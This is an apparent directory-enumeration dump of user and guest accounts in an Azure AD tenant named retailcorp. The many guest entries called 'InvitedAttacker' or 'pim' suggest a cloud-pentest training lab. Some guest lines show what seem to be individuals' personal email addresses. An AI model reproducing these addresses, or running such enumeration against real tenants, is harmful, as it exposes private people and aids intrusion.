+kuja-pim               b6fd8dca-142a-4a3e-8ed5-55826cf309e4 kuja-pim@mrwamatogmail.onmicrosoft.com                  kuja-pim_mrwamatogmail.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+Labber1                5563a938-eb8a-4b3b-a019-e742548d2d52 labber1pimadmin@testlabcs4.onmicrosoft.com              labber1pimadmin_testlabcs4.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+labtesting001pim       725db631-bc5b-4be3-b009-2c8e93871362 labtesting001pim@outlook.com                            labtesting001pim_outlook.com#EXT#@retailcorp.onmicrosoft.com
+Larry G Moulton        eb7ecc55-94a4-4e46-94f3-5c1ef1031b5c                                                         LarryGMoulton@retailcorp.onmicrosoft.com
+Latrice R Cokley       d609635e-2182-4fd5-a506-0073b5e006bd                                                         LatriceRCokley@retailcorp.onmicrosoft.com
+Lavina H Bernard       85f1f725-af29-4421-8425-aebad463a447                                                         LavinaHBernard@retailcorp.onmicrosoft.com
+Lee N Butler           097c450e-af32-47a3-8fce-d0f13a14350d                                                         LeeNButler@retailcorp.onmicrosoft.com
+Linda K Trombley       6710372c-a7ea-4c54-bdc2-f80fa65cb560                                                         LindaKTrombley@retailcorp.onmicrosoft.com
+Lisa S Perez           004683e7-6b1c-458e-b6c1-4ea0a34fa599                                                         LisaSPerez@retailcorp.onmicrosoft.com
+Logan M Duda           8d491135-f883-4715-a559-9feaa62acebc                                                         LoganMDuda@retailcorp.onmicrosoft.com
+FNU LNU                43343b0a-c9d7-4544-a4b9-1fb52fc36c77 Lokesh@lokeshbhade.onmicrosoft.com                      Lokesh_lokeshbhade.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+Shubham Ravate         acbfe71f-e627-4ede-a1a9-d55e386e09ac lordvoldemort@shubhamravate.onmicrosoft.com             lordvoldemort_shubhamravate.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+Lori D Fortune         d7d68f06-fe53-4719-b5d6-7e5466644f95                                                         LoriDFortune@retailcorp.onmicrosoft.com
+Lorine A Carter        b3a08364-dd8b-4396-bd35-54b787e79be5                                                         LorineACarter@retailcorp.onmicrosoft.com
+Lou D Hatfield         ea199011-377f-4b93-abea-016e26f3699a                                                         LouDHatfield@retailcorp.onmicrosoft.com
+Luh Pim                d5e93e3e-c451-402e-b240-6323402d9b29 luhpim@hrehman1181gmail.onmicrosoft.com                 luhpim_hrehman1181gmail.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+Thomas Girard          a3cca280-b774-4345-b05d-b1d07299f1ed m4z4rs@m4z4rs.onmicrosoft.com                           m4z4rs_m4z4rs.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+Marcy A McClanahan     10cb6605-9eec-48f8-9f75-88a12118a741                                                         MarcyAMcClanahan@retailcorp.onmicrosoft.com
+Margarita F Rice       2081969a-77ea-4683-a9b2-0cf2e6919bf8                                                         MargaritaFRice@retailcorp.onmicrosoft.com
+Marguerite J Wilson    2d4fef92-22ce-497c-814c-a0e150bebe13                                                         MargueriteJWilson@retailcorp.onmicrosoft.com
+Maria M Higgins        3aac83e3-cb14-4a8c-8ec0-b2c17221824b                                                         MariaMHiggins@retailcorp.onmicrosoft.com
+Maria Pilar            ec4c8450-9f11-4587-88d2-da3159cf8e02 mariapim@portomoko.onmicrosoft.com                      mariapim_portomoko.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+Marion A Campbell      106f88ff-e12e-4db0-aff4-220f108e87f5                                                         MarionACampbell@retailcorp.onmicrosoft.com
+Marion A Christian     17cdee35-fa72-4827-9c70-5380d409640f                                                         MarionAChristian@retailcorp.onmicrosoft.com
+Marisa C Wells         678ff97f-89b2-4b6b-80e3-03b0e3c58093                                                         MarisaCWells@retailcorp.onmicrosoft.com
+Mark D Garner          725bfc17-2335-42f5-8a4a-751a97e75253                                                         MarkDGarner@retailcorp.onmicrosoft.com
+Mark K Palmer          49fefdd2-7194-4d7e-81c1-10b3fbcfb0ca                                                         MarkKPalmer@retailcorp.onmicrosoft.com
+Martha C Wagoner       d3445fe7-a0bd-484a-ac4e-ae9842179a13                                                         MarthaCWagoner@retailcorp.onmicrosoft.com
+Martha J Loken         f5d3ebd6-1b75-4f24-8d3f-cb3e2638e483                                                         MarthaJLoken@retailcorp.onmicrosoft.com
+Martha K Roman         029add82-7cbb-45fe-9a8f-af73d2dd2ac5                                                         MarthaKRoman@retailcorp.onmicrosoft.com
+Mary D Mack            edfbfac3-1a1b-4539-abdb-f426779e2a82                                                         MaryDMack@retailcorp.onmicrosoft.com
+Mary G Jensen          f3b09c6f-3496-4594-80ba-ee8059e1bf37                                                         MaryGJensen@retailcorp.onmicrosoft.com
+Mary J Phelps          331a2f90-6fdf-4a32-945e-b3cb8bd4ea6c                                                         MaryJPhelps@retailcorp.onmicrosoft.com
+Matthew B Bauman       c06249a6-f948-4760-a989-1d707ffb7264                                                         MatthewBBauman@retailcorp.onmicrosoft.com
+Matthew C Talmadge     6a8b1201-42f1-4b00-b2d0-e6713f5695a6                                                         MatthewCTalmadge@retailcorp.onmicrosoft.com
+Matthew R Su           55128eeb-fbd7-4c30-8ee1-8acf5bc1a12e                                                         MatthewRSu@retailcorp.onmicrosoft.com
+Maureen J Pilcher      163256bf-ec99-4013-8406-0a576a286be6                                                         MaureenJPilcher@retailcorp.onmicrosoft.com
+Mauricio P Chapman     503ccd1e-e535-4614-b85b-4ace636e3448                                                         MauricioPChapman@retailcorp.onmicrosoft.com
+Raymond Wan            e0c640bd-64d9-4f58-8561-4d464f9182f0 maximusredteam@maximusredteam.onmicrosoft.com           maximusredteam_maximusredteam.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+Melinda F Pierson      ccc47ee2-1692-4b03-9342-4d6eec2bfdf9                                                         MelindaFPierson@retailcorp.onmicrosoft.com
+Melissa V Mackey       c7e544a2-6eed-487f-8fcf-39531a8bdb98                                                         MelissaVMackey@retailcorp.onmicrosoft.com
+Melvin J Dean          da16184a-2539-42a4-8755-31a67b7c6799                                                         MelvinJDean@retailcorp.onmicrosoft.com
+Michael K Berry        84665c67-25cb-4091-ae7c-a95f1a80d61f                                                         MichaelKBerry@retailcorp.onmicrosoft.com
+Michael K Fager        6759e33b-a3ee-4f6b-861b-d3b6f77046c7                                                         MichaelKFager@retailcorp.onmicrosoft.com
+Michael K Haywood      64727ffe-43c1-423b-ae6c-5edc0d30c585                                                         MichaelKHaywood@retailcorp.onmicrosoft.com
+Michele R Christensen  d2634c1f-9428-461f-a088-fd4449b6ab0b                                                         MicheleRChristensen@retailcorp.onmicrosoft.com
+Michelle J Grant       f45cf023-04dd-4878-ab85-53c1a71a50c5                                                         MichelleJGrant@retailcorp.onmicrosoft.com
+Miguel E Kellogg       25038bf4-5339-44f3-9561-d367e38a8127                                                         MiguelEKellogg@retailcorp.onmicrosoft.com
+Minnie J Best          eaf93872-0d51-43a9-973c-64c6e2789844                                                         MinnieJBest@retailcorp.onmicrosoft.com
+Monika AltSec          8ef1a145-f845-4d01-8d9c-e5cbc669241c                                                         monika_alteredsecurity.com#EXT#_monikaalteredsecurity.XMOVN#EXT#@retailcorp.onmicroso…
+Morgan K Anderson      f8fb4d20-feda-483a-b91f-353656eb46d4                                                         MorganKAnderson@retailcorp.onmicrosoft.com
+Nami                   419824df-b0dc-4c3f-960a-a8b826601ae6 nami-operations@ichimonjo.onmicrosoft.com               nami-operations_ichimonjo.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+Nellie T Hart          30e01029-c95c-4f02-9092-0e3cadcb5664                                                         NellieTHart@retailcorp.onmicrosoft.com
+InvitedAttacker1       dd62932e-d4f4-4f9d-9d32-3aeac85f7def netfendr@netfendrgmail.onmicrosoft.com                  netfendr_netfendrgmail.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+Not                    d059d022-6181-44f5-8682-0fa6c3bd68ff not@securityowl.onmicrosoft.com                         not_securityowl.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+Numbers E Berger       7e28180d-bb7f-4c82-b1bc-5dd7842e76a4                                                         NumbersEBerger@retailcorp.onmicrosoft.com
+ope                    4c6e7c81-5520-4df4-b84c-9bcba2d8448c operation@gabrujas.onmicrosoft.com                      operation_gabrujas.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+operation              5e9e4ceb-0693-4448-a967-c7842db55f5c operation@rougedomain.onmicrosoft.com                   operation_rougedomain.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+attackeracidburn       b869bd17-0b8e-40b1-b480-f9f29b8520a4 operation_acdusertest@adminaccone.onmicrosoft.com       operation_acdusertest_adminaccone.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+InvitedAttacker5       ca5990b2-a86c-4463-b9d4-8afb0fce79a1 operation@adhackpro.onmicrosoft.com                     operation_adhackpro.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+InvitedAttacker1       4b09cd87-d454-4b39-bba8-3a6e5d5842c2 operation@azuremvapt.onmicrosoft.com                    operation_azuremvapt.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+InvitedAttacker150     d1cc9684-e76a-404c-bb7a-42ada1227356 operation@tnjg4.onmicrosoft.com                         operation_tnjg4.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+InvitedAttacker1       b0a7b7a6-96e9-477c-9e0c-38fc1ff093b8 operation404@outlook.com                                operation404_outlook.com#EXT#@retailcorp.onmicrosoft.com
+operations-test-user   34d6402b-25d6-4d92-a4e6-62ddbcb2ef25 operations-test-user@protonmail.com                     operations-test-user_protonmail.com#EXT#@retailcorp.onmicrosoft.com
+InvitedAttacker1       4d2de917-5074-48e4-b158-9fc58e41e73a operations.mantis@outlook.com                           operations.mantis_outlook.com#EXT#@retailcorp.onmicrosoft.com
+OperationsGuest        906e93cf-9bf4-4266-a440-7942a968e224 operations.srushti@outlook.com                          operations.srushti_outlook.com#EXT#@retailcorp.onmicrosoft.com
+InvitedAttacker1       ed5ae1a4-a2b2-4302-adc2-caded9723f14 operations.team123123@outlook.com                       operations.team123123_outlook.com#EXT#@retailcorp.onmicrosoft.com
+Emil Lange             ac59be1e-4039-422d-a9c7-56069578bc21 operations.teams@hotmail.com                            operations.teams_hotmail.com#EXT#@retailcorp.onmicrosoft.com
+InvitedAttacker1       a20b369e-d467-4271-9ca3-bfdb8e5ecfa2 operations.yonko@outlook.com                            operations.yonko_outlook.com#EXT#@retailcorp.onmicrosoft.com
+Chris green            b28762a5-f812-4502-98c0-84afb70ff048 operations@aaaabbbbcccc.onmicrosoft.com                 operations_aaaabbbbcccc.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+pim                    67eb0a81-ab40-4069-83bc-bb621aec7da7 operations@adhackpro.onmicrosoft.com                    operations_adhackpro.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+Penne Tester           193a7b99-28e3-4875-a923-f92b2b08a4a6 operations@azadpt.onmicrosoft.com                       operations_azadpt.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+User01                 c53d20ca-09b0-43ef-93e8-93e7919c949a operations@azureop.onmicrosoft.com                      operations_azureop.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+operations             cafc2249-e691-41b9-b3f3-eea23ca18dc6 operations@cloudnein.onmicrosoft.com                    operations_cloudnein.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+Attacker1              68ba8463-16d3-459c-a085-9fc981c74917 operations@cybalt1.onmicrosoft.com                      operations_cybalt1.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+op                     986f64ff-74b0-455d-b141-092fbf69b20b operations@initcrew.onmicrosoft.com                     operations_initcrew.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+Attacker03-knt         a09a8203-0fe9-441a-8683-2db049abf864 operations@kntdwaapt.onmicrosoft.com                    operations_kntdwaapt.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+Rupert Gerl            daaf3181-2877-4a18-857c-ba358e69ca71 operations@kramerica69.onmicrosoft.com                  operations_kramerica69.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+operations             c1d0d787-7959-43d5-afd8-0b87c8243907 operations@learningpentestazuread.onmicrosoft.com       operations_learningpentestazuread.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+Operations             3457443c-5785-440c-afaa-fccc36e69a67 operations@mdegrandi.onmicrosoft.com                    operations_mdegrandi.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+Operations             98ef4e36-2554-4bbb-830a-a739086c8a8b operations@newtestlabtennant.onmicrosoft.com            operations_newtestlabtennant.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+operations             344552d0-b349-4893-84b3-ccd57945b87a operations@pjpentestlabs.onmicrosoft.com                operations_pjpentestlabs.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+operations             084684be-50b4-4566-8059-708739b807c3 operations@sanderbo.onmicrosoft.com                     operations_sanderbo.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+Opertations            e3aac627-dabd-4e93-bf9b-097726a8da41 operations@secforever.onmicrosoft.com                   operations_secforever.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+InvitedAttacker1       5835bbc6-f527-42d5-bf47-0315e791b94e operations_404@outlook.com                              operations_404_outlook.com#EXT#@retailcorp.onmicrosoft.com
+InvitedFake2           b42267f7-42d8-4886-b2c2-169253e2706c operations@cloudnein.onmicroft.com                      operations_cloudnein.onmicroft.com#EXT#@retailcorp.onmicrosoft.com
+Attacker               56f06d89-d176-4be4-9a20-d7953f87196c operations_j@outlook.com                                operations_j_outlook.com#EXT#@retailcorp.onmicrosoft.com
+InvitedTest            d6f61c02-bf0c-46b7-b5ba-fc83c66be7b6 operations@microsoft356login.onmicrosoft.com            operations_microsoft356login.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+S0ftwar                052d9f47-e103-4254-bf4b-b803903ff9fd operations@s0ftwar.onmicrosoft.com                      operations_s0ftwar.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+Emil Lange             bf16b598-5269-417f-95f9-bfb5adc545c6 operations_teams@hotmail.com                            operations_teams_hotmail.com#EXT#@retailcorp.onmicrosoft.com
+Attacker2              04daa745-1eab-4ebe-8427-7d44c4eb76d5 operations@tnjg4.onmicrosoft.com                        operations_tnjg4.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+operations Admin       97276e16-b38a-45d0-bfda-3d0daaf1de57 operationsAdmin@verycute.onmicrosoft.com                operationsAdmin_verycute.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+Ophelia D Jenkins      8ddc61d1-4cc4-4911-80f9-fde093fd4f69                                                         OpheliaDJenkins@retailcorp.onmicrosoft.com
+Oscar A Mathews        7e7b673b-ce3c-405b-9834-f466dab8bc32                                                         OscarAMathews@retailcorp.onmicrosoft.com
+InvitedAttacker1       2ccd1f44-842e-48cc-91b7-5b81bc6a7100 outlook_6296FE5E275AF530@outlook.com                    outlook_6296FE5E275AF530_outlook.com#EXT#@retailcorp.onmicrosoft.com
+Pamela J Doyle         a801e90d-0d23-4e0a-a71b-14ffc2c97cdf                                                         PamelaJDoyle@retailcorp.onmicrosoft.com
+Pamela S Davidson      0c5307e1-931b-44ec-b3ec-4736b63c055b                                                         PamelaSDavidson@retailcorp.onmicrosoft.com
+Omar Alayli            36cac143-2981-4670-9468-bd987b50e573 panda@mastercifu.onmicrosoft.com                        panda_mastercifu.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+Patrice D Mitchell     47762b28-37a4-46e3-856b-3ff523a9d8cb                                                         PatriceDMitchell@retailcorp.onmicrosoft.com
+Patricia J Boyd        429bac09-6155-4e9f-b782-94f341fbe23e                                                         PatriciaJBoyd@retailcorp.onmicrosoft.com
+Patricia R Montano     5bc9bd6a-18f3-4b4f-802a-b1d861d5e31f                                                         PatriciaRMontano@retailcorp.onmicrosoft.com
+Patrick A Evans        af5f7cbe-b47f-49d2-a6fc-ccd58269e21c                                                         PatrickAEvans@retailcorp.onmicrosoft.com
+Patrick I Lyons        26b91894-248c-415c-bb79-216bd99e54ce                                                         PatrickILyons@retailcorp.onmicrosoft.com
+Pauline J Nicholson    b7bfd35a-34b9-4144-af98-9ec0eea85396                                                         PaulineJNicholson@retailcorp.onmicrosoft.com
+Paul P Maldonado       96ff2d7c-d285-40a5-8179-9642cb227375                                                         PaulPMaldonado@retailcorp.onmicrosoft.com
+Penny R Martin         524bb6e8-c332-427a-8b71-5c71bcf99d0b                                                         PennyRMartin@retailcorp.onmicrosoft.com
+Peter H Bacon          71cc78e5-bd03-4e6e-93b6-c26e8c3651db                                                         PeterHBacon@retailcorp.onmicrosoft.com
+Philip M Hooper        65e222d1-51ab-4e6b-b35a-9b595c6cfb71                                                         PhilipMHooper@retailcorp.onmicrosoft.com
+Phillip H Sandoval     d5233707-ec20-4ccc-96b1-02ac23cc467e                                                         PhillipHSandoval@retailcorp.onmicrosoft.com
+Phyllis J Davis        fe03cd0e-3a06-47f8-b69d-81817ff19a66                                                         PhyllisJDavis@retailcorp.onmicrosoft.com
+InvitedAttacker1       028f047f-ea4e-47e7-9a54-514a69f1c0d1 pim-cybersecedu@outlook.com                             pim-cybersecedu_outlook.com#EXT#@retailcorp.onmicrosoft.com
+pim-gamotoapoel        f865d58a-126d-42d5-a632-34b8ba29b67b pim-gamotoapoel@GeorgeSkouroupathishotmail.onmicrosoft… pim-gamotoapoel_GeorgeSkouroupathishotmail.onmicrosoft#EXT#@retailcorp.onmicrosoft.com
+pim-user01             5000ab0f-ab34-44f3-80bf-5ca1a3ee10c3 pim-user01@domaintest666.onmicrosoft.com                pim-user01_domaintest666.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+InvitedAttacker269     af2c975b-6eaf-47c8-ba85-8fb60d3fe289 pim.haha3@gmail.com                                     pim.haha3_gmail.com#EXT#@retailcorp.onmicrosoft.com
+DavidHarry123          a0e44730-990c-441d-baae-75cb18dd7580 pim.harry.1047@outlook.com                              pim.harry.1047_outlook.com#EXT#@retailcorp.onmicrosoft.com
+InvitedAttacker1       ff730497-c0ff-422b-b7df-f5ca13227896 pim.nazarulla@outlook.com                               pim.nazarulla_outlook.com#EXT#@retailcorp.onmicrosoft.com
+AcidBurnDK             d9dab361-ab3e-4580-a74b-950b4c33f84a pim.onmicrosoft.com#EXT#@adminaccone.onmicrosoft.com    pim.onmicrosoft.com#EXT#_adminaccone.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+InvitedAttacker1       1a922727-407c-4cb3-9180-b7a20081b616 pim.operator42@outlook.com                              pim.operator42_outlook.com#EXT#@retailcorp.onmicrosoft.com
+pimp                   f119eb2d-b5a6-471e-88f4-cc2788201d40 pim.p@umbranovit.onmicrosoft.com                        pim.p_umbranovit.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+InvitedAttacker1       74e38860-6218-4edf-9d6f-c2cdc231c48b pim.user874156@outlook.com                              pim.user874156_outlook.com#EXT#@retailcorp.onmicrosoft.com
+Tim Pim                6bc29273-c4ca-45da-b627-5859afc12216 pim@02brq.onmicrosoft.com                               pim_02brq.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+Pim                    c9de09d0-d96c-40a0-a050-362ae17f9f86 pim@1v43bw.onmicrosoft.com                              pim_1v43bw.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+AlteredSecurity        87d2c08f-39f0-4f59-9f26-a129ecb5e6af pim@4t5phv.onmicrosoft.com                              pim_4t5phv.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+pim                    dff35719-c314-4c35-bbc8-904c8fd5e278 pim@4v61rc.onmicrosoft.com                              pim_4v61rc.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+user star              17c8b445-945b-4fd1-b06d-5949b82b4638 pim@574r570rm.onmicrosoft.com                           pim_574r570rm.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+InvitedAttacker1       d99cdbed-b9e7-4af1-87e0-c59d53903476 pim@6h4ackdomain.onmicrosoft.com                        pim_6h4ackdomain.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+attacker               646ce09d-7504-4be5-9a61-46e5b7e87f16 pim@aaaabbbbcccc.onmicrosoft.com                        pim_aaaabbbbcccc.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+Pim                    3f59c972-daf2-4b97-83d1-b2a9e18a5fe3 pim@aadildsjcemedu.onmicrosoft.com                      pim_aadildsjcemedu.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+pim                    1c69c546-16fa-4d19-b91a-bf4ee84b32c9 pim@abhijithknamboothiri.onmicrosoft.com                pim_abhijithknamboothiri.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+User 01                505f0c23-080d-46b2-916b-474f20f89981 pim@abhishek0809.onmicrosoft.com                        pim_abhishek0809.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+PIMGuest               043526c9-69f0-44b8-8dac-cd068b05b6c6 pim@abnonymous.onmicrosoft.com                          pim_abnonymous.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+pimme                  9dea4daa-e94b-4e36-a396-79e68c30a364 pim@adhackpro.onmicrosoft.com                           pim_adhackpro.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+PIMUser                2a390a1c-0bf2-465e-b8f2-a7dd09119b36 pim@alabhurammacrosec.onmicrosoft.com                   pim_alabhurammacrosec.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+tester                 55b75c00-4277-43a3-9ffe-f4ab588261f2 pim@aliandani95gmail.onmicrosoft.com                    pim_aliandani95gmail.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+admin 12               de5603f7-8aca-4fa1-b318-0d267824759a pim@alteredseclab.onmicrosoft.com                       pim_alteredseclab.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+pim                    8ecea95d-721b-46c1-830e-2679791712d9 pim@amansahni2000gmail.onmicrosoft.com                  pim_amansahni2000gmail.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+pimadmin               a52fbb1e-32e8-4838-bbb8-57987b801cd5 pim@amedafernandez.onmicrosoft.com                      pim_amedafernandez.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+Adarsh R               87f726d6-bb9d-4d37-8414-2c388f3ef327 admin@andru1999.onmicrosoft.com                         admin_andru1999.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+Pim                    0a4586d4-7753-42fe-8cfd-5d521786af5f pim@aniltom555gmail.onmicrosoft.com                     pim_aniltom555gmail.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+FNU LNU                7a8e6ad7-56e2-4aad-90d3-3056f2c21322 pim@anuattacker.onmicrosoft.com                         pim_anuattacker.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+GuestUser69            809280cb-9e08-47cb-b9e4-5e85a84d0efa pim@asptestingintro.onmicrosoft.com                     pim_asptestingintro.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+FNU LNU                c0716d0e-4022-4c6f-947d-6e2128fcc17d pim@aswathykm97.onmicrosoft.com                         pim_aswathykm97.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+Attacker               bf9deb25-d38e-4414-be45-0b1003d573cf pim@attackerdomain.onmicrosoft.com                      pim_attackerdomain.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+pim                    19829a1e-7f3d-480a-b6c1-2534af07f721 pim@aubreysensepostgmail.onmicrosoft.com                pim_aubreysensepostgmail.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+pim                    581007bd-46f8-4746-8642-f1a7ef14dea5 pim@auror007.onmicrosoft.com                            pim_auror007.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+pim                    6edc9dad-1eaa-4cd3-b8f6-96060d085447 pim@avielg85gmail.onmicrosoft.com                       pim_avielg85gmail.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+wow                    bb25b6e2-8b8c-4677-bb11-ecf67868ce01 pim@aws25783gmail.onmicrosoft.com                       pim_aws25783gmail.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+pim                    9bddd62c-969c-4392-a447-855df71f512b pim@awsaccthreeprotonmail.onmicrosoft.com               pim_awsaccthreeprotonmail.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+pim                    73f9e90f-791e-4294-80e6-0fdacf51a257 pim@ayushadhikari.onmicrosoft.com                       pim_ayushadhikari.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+Pimmetje               9634260a-040e-4783-a521-440f4959f58e pim@azad4me.onmicrosoft.com                             pim_azad4me.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+pim                    b9da0de4-0572-4839-99b1-0343eca6622c pim@azadsail.onmicrosoft.com                            pim_azadsail.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+pim                    a415313b-b4c3-4370-8cc0-224d89140c3a pim@azadsnd.onmicrosoft.com                             pim_azadsnd.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+PIM                    d0209f83-f652-4459-931a-d2f939ee6bb4 pim@azlabsheitoroutlook.onmicrosoft.com                 pim_azlabsheitoroutlook.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+FNU LNU                db81f0af-d39f-4f7e-9712-ed9efcfaddea pim@azpim1.onmicrosoft.com                              pim_azpim1.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+pim                    4648b2ff-e689-4e9d-9bd4-6155da6cbd62 pim@azurepentest.onmicrosoft.com                        pim_azurepentest.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+pim                    84393b06-c78a-45b6-8fc2-33d49ed6e8d6 pim@azurevapt.onmicrosoft.com                           pim_azurevapt.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+pim                    d3f81868-f809-4be9-8955-8555f86641f7 pim@bhardwajhitesh9gmail.onmicrosoft.com                pim_bhardwajhitesh9gmail.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+pim                    502c8c63-0e09-4d11-a00d-3145406d85b0 pim@bhavsec.onmicrosoft.com                             pim_bhavsec.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+pim                    f8966df1-87b2-4a73-b67f-c85f763de228 pim@bougrines.onmicrosoft.com                           pim_bougrines.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+Pim                    882c283b-d267-4bd4-a9cf-2c31d77c8422 pim@bowojori7gmail.onmicrosoft.com                      pim_bowojori7gmail.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+pim                    89b1f1c0-1f1f-4203-ad95-63f50a12e5c5 pim@breachdefs.onmicrosoft.com                          pim_breachdefs.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+sbem                   10994f29-6cd0-4abc-b379-177f8263ec30 pim@brmhome.onmicrosoft.com                             pim_brmhome.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+pimpim                 b20ba71e-74f9-431b-ace9-fbceb2986d3e pim@bsidespewpewgmail.onmicrosoft.com                   pim_bsidespewpewgmail.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+pim guy                a813a668-af6f-4c5f-abaa-3863cd82c53f pim@bug4rt.onmicrosoft.com                              pim_bug4rt.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+pim                    69a3afd2-d540-4f8c-aea4-d526f30cba34 pim@cachupin23.onmicrosoft.com                          pim_cachupin23.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+pim                    02aff386-9935-4c20-99f3-2ee8ad038f38 pim@cadwellcloud.onmicrosoft.com                        pim_cadwellcloud.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+pim                    6fd267ac-94ac-43b9-bd3a-e8420ac1f0cc pim@ccp2809.onmicrosoft.com                             pim_ccp2809.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+pim                    2e6012b9-2c19-4863-ab56-b6d71e59d238 pim@chewzhichao.onmicrosoft.com                         pim_chewzhichao.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+Pim                    e53bda01-92fb-40ab-a9f8-217cbcb0781e pim@christian851201hotmail.onmicrosoft.com              pim_christian851201hotmail.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+pim                    808e4a55-9e1e-4067-9fa2-8f7df24393cd pim@chuckbell3gmail.onmicrosoft.com                     pim_chuckbell3gmail.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+pim                    1cd4116f-3414-447b-9d61-9908e03672fb pim@cloudpentesttraining.onmicrosoft.com                pim_cloudpentesttraining.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+pim                    bb4f27a3-623f-439b-a9af-84304f5c8c41 pim@cobaltaureoutlook.onmicrosoft.com                   pim_cobaltaureoutlook.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+PIM Attacker           f66d481b-8b76-4c8c-9424-e70ca90a5fe5 pim@code9lab.onmicrosoft.com                            pim_code9lab.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+user01                 422d7bb8-480b-4801-bf1b-5a711efd39c8 pim@condo08.onmicrosoft.com                             pim_condo08.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+PIM                    2f6ad5c6-ab8f-437c-869c-67bb37581d9e pim@contosobrodrigues.onmicrosoft.com                   pim_contosobrodrigues.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+Chris Green            2db40211-f9d4-4cdd-952a-cc1b015369ec pim@contosomarketing198294892.onmicrosoft.com           pim_contosomarketing198294892.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
